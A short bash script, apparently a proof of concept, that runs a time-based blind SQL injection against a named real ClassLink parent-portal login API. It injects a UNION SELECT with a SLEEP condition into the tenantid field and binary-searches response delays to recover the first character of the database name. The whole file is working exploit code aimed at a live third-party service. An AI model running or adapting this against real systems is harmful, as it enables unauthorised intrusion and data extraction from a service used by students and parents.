#!/bin/bash

# Fun colors and styling
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# Bold color combinations
BOLD_RED="${BOLD}${RED}"
BOLD_GREEN="${BOLD}${GREEN}"
BOLD_YELLOW="${BOLD}${YELLOW}"
BOLD_CYAN="${BOLD}${CYAN}"
BOLD_MAGENTA="${BOLD}${MAGENTA}"

# JSON syntax highlight function using jq and ANSI colors
highlight_json() {
  jq --color-output .
}

URL="https://parents.classlink.com/proxies/api/portal/student/logintype"
USER="test@test.com"

echo -e "${BOLD_CYAN}[*] Starting binary search for first character of DATABASE()...${RESET}"

low=32   # Start at space (printable ASCII)
high=126 # End at tilde (printable ASCII)
found_char="?"

while [ $low -le $high ]; do
  mid=$(( (low + high) / 2 ))

  # SQL condition: ASCII(SUBSTRING(DATABASE(),1,1)) >= $mid
  SQL_CONDITION="ASCII(SUBSTRING(DATABASE(),1,1))>=$mid"
  JSON_BODY="{\"user_name\":\"$USER\",\"tenantid\":\"3702 UNION SELECT IF($SQL_CONDITION, SLEEP(3), NULL) -- -\"}"

  echo -e "${BOLD_CYAN}[*] Testing:${RESET} ${BOLD_YELLOW}ASCII >= $mid${RESET} ('$(printf "\\$(printf '%03o' $mid)")')"

  START_TIME=$(date +%s)

  RES=$(curl -s -X POST "$URL" \
    -H "Content-Type: application/json" \
    -d "$JSON_BODY")

  END_TIME=$(date +%s)
  ELAPSED_TIME=$((END_TIME - START_TIME))

  if [ $ELAPSED_TIME -ge 3 ]; then
    # Condition is TRUE, so char >= mid
    low=$((mid + 1))
    found_char=$(printf "\\$(printf '%03o' $mid)")
    echo -e "${BOLD_GREEN}[*] Condition TRUE (delay $ELAPSED_TIME s): char >= $mid ($found_char)${RESET}"
  else
    # Condition is FALSE, so char < mid
    high=$((mid - 1))
    echo -e "${BOLD_RED}[*] Condition FALSE (delay $ELAPSED_TIME s): char < $mid${RESET}"
  fi
done
echo ""

echo -e "${BOLD_MAGENTA}[*] First character of DATABASE() is likely:${RESET} ${BOLD_GREEN}$found_char${RESET} (ASCII $(printf '%d' "'$found_char") )"
